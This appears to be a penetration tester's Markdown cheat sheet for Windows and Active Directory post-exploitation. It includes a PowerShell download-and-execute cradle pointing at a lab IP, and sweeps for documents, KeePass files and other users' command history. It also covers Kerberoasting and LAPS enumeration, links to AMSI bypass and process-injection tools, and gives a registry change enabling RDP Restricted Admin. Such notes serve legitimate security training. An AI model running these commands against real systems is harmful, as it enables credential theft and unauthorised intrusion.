# To DO:

- find code and have links to different injection techniques with descriptions
## Enumeration
- Bloodhound/Sharphound
- open ports internally and externally
- users files 
	- .ssh
	- /tmp
	- bash_history
	- powershell command history

## Powershell

#### Download scripts
```powershell
iex(new-object system.net.webclient).downloadstring('http://192.168.49.68/_<ToolName>_.ps1')
```

##### Searching
```powershell
Get-ChildItem -Path C:\Users -Include *.txt,*.doc,*.pdf,*.docx,*.xls,*.xlsx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

##### Command history
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

#### Search all including hidden
```powershell
Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue -Force| where Length -gt 0kb
```

#### Invoke Commands Remotely

```powershell
Invoke-Command -computername <name> -scriptblock { whoami }
```
- do things like rollback Windows Defender or execute payloads

#### Obfuscation
- Invoke-Steatlh on kali (https://github.com/JoelGMSec/Invoke-Stealth?tab=readme-ov-file)
## PowerView

- Website https://powersploit.readthedocs.io/en/latest/Recon/
- General Commands to try
```
ConvertTo-SID                   -   converts a given user/group name to a security identifier (SID)
```
```
Invoke-Kerberoast               -   requests service tickets for kerberoast-able accounts and returns extracted ticket hashes
```
```
Get-Domain                      -   returns the domain object for the current (or specified) domain
```
```
Get-Forest                      -   returns the forest object for the current (or specified) forest
```
```
Get-ForestDomain                -   return all domains for the current (or specified) forest
```
```
Get-DomainUser                  -   return all users or specific user objects in AD
```

#### Find all LAPS-enabled machines
```powershell
Get-DomainComputer -LDAPFilter '(ms-Mcs-AdmPwdExpirationtime=*)'
```

##### **Enumerates all users/groups who can view LAPS password on specified `LAPSCLIENT.test.local` machine**
```powershell
Get-DomainComputer LAPSCLIENT.test.local | 
	Select-Object -ExpandProperty distinguishedname | 
	ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { 
		Get-DomainObjectAcl -ResolveGUIDs $_.ObjectDN 
	} | Where-Object { 
		($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and 
		($_.ActiveDirectoryRights -match 'ReadProperty')
	} | Select-Object -ExpandProperty SecurityIdentifier | Get-DomainObject
```



## PowerUp



## Tools to not forget

- Invoke-ReflectivePEInjection
- impacket tools
- krbrelayx
- ntlmrelay
- comsvcs.dll (dump process memory to file)
- UAC Bypass

## Kerberos tickets

- look in /tmp on linux hosts
- run klist to see tickets on windows and linux 

## Websites for Tools

### AMSI Bypass
- https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file


### Code Snippets
- https://github.com/chvancooten/OSEP-Code-Snippets
- https://github.com/tasox/CSharp_Process_Injection/tree/main


### Install always elevated

```powershell
# Check User Policy
$userPolicy = Get-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

# Check Machine Policy
$machinePolicy = Get-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

# Output Results
if ($userPolicy.AlwaysInstallElevated -eq 1) {
    Write-Host "User policy for AlwaysInstallElevated is enabled."
} else {
    Write-Host "User policy for AlwaysInstallElevated is disabled or not set."
}

if ($machinePolicy.AlwaysInstallElevated -eq 1) {
    Write-Host "Machine policy for AlwaysInstallElevated is enabled."
} else {
    Write-Host "Machine policy for AlwaysInstallElevated is disabled or not set."
}

```


### RDP Restricted Admin

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation" | Select-Object RestrictedAdmin, AllowRestrictedAdmin
```

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational' -FilterHashtable @{Id=1149} | ForEach-Object {
    $_.Message
} | Select-String -Pattern "RestrictedAdmin"
```

- Disable Restricted Admin
```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```